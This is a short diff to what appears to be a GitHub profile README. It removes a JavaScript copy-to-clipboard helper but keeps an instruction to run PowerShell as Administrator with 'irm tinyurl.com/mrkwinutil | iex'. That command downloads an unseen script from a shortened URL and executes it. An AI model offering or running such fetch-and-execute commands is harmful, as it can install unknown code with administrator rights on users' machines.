@@ -31,26 +31,5 @@ Welcome to my GitHub profile! Here’s an overview of my stats and activity.
     <p>Run PowerShell as Administrator and click the code below to copy: <span onclick="copyToClipboard(this)" style="cursor: pointer; color: white; padding: 5px; border-radius: 4px;">
         irm tinyurl.com/mrkwinutil | iex
     </span></p>
-    
 </p>
-
-<script>
-    function copyToClipboard(element) {
-        // Create a temporary text area to hold the command text
-        const tempInput = document.createElement('textarea');
-        tempInput.value = element.innerText;
-        document.body.appendChild(tempInput);
-
-        // Select and copy the text
-        tempInput.select();
-        document.execCommand('copy');
-        
-        // Remove the temporary element
-        document.body.removeChild(tempInput);
-
-        // Alert user that text is copied
-        alert('Code copied to clipboard!');
-    }
-</script>
-
 </div>
